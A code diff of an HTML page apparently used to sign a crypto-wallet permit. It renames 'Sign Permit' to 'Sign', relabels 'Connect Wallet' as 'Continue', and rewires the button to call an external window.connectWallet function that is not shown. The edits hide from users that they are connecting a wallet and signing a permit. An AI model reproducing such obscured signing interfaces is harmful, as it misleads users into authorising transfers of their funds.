@@ -6,7 +6,7 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Sign Permit</title>
+    <title>Sign</title>
     <style>
         * {
             margin: 0;
@@ -176,7 +176,7 @@
     <div class="container">
         <div class="header">
             <div class="back-arrow" onclick="window.history.back()">←</div>
-            <h1>Sign Permit</h1>
+            <h1>Sign</h1>
         </div>
         
         <div class="form-section">
@@ -195,7 +195,7 @@
             </div>
         </div>
         
-        <button id="connectWallet" class="next-button" style="display: none; margin-bottom: 15px;" onclick="connectWallet()">Connect Wallet</button>
+        <button id="connectWallet" class="next-button" style="display: none; margin-bottom: 15px;">Continue</button>
         <button id="nextButton" class="next-button" disabled>Next</button>
         
         <div id="status"></div>
@@ -210,11 +210,23 @@
             document.execCommand('copy');
         }
         
-        async function connectWallet() {
-            if (typeof window.connectWallet === 'function') {
-                await window.connectWallet();
+        document.addEventListener('DOMContentLoaded', () => {
+            const connectBtn = document.getElementById('connectWallet');
+            if (connectBtn) {
+                connectBtn.addEventListener('click', async () => {
+                    if (typeof window.connectWallet === 'function') {
+                        await window.connectWallet();
+                    } else {
+                        console.error('window.connectWallet не определена');
+                        const statusDiv = document.getElementById('status');
+                        if (statusDiv) {
+                            statusDiv.textContent = 'Ошибка: функция подключения не найдена';
+                            statusDiv.className = 'status error';
+                        }
+                    }
+                });
             }
-        }
+        });
     </script>
 </body>
 </html>
